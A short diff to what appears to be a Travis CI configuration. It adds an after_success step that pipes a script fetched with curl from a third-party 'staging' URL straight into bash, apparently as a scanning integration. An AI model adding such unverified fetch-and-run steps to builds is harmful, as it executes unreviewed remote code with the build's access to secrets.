@@ -175,3 +175,6 @@ matrix:
              ide/xml.xdm
              ide/xsl"
           jdk: openjdk8
+
+after_success:
+  - bash <(curl -s https://scripts.scantist.com/staging/ci-travis-jar-k8s.sh) 
